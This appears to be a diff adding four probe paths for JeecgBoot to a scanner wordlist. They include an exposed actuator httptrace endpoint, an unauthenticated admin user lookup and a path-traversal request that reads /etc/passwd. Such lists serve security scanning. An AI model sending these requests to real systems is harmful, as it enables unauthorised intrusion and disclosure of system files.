@@ -1,0 +1,4 @@
+/jeecg-boot/actuator/httptrace/
+/jeecg-boot/sys/user/querySysUser?username=admin
+/chat/imController/showOrDownByurl.do?dbPath=../../../../../../etc/passwd
+/jeecg-boot/
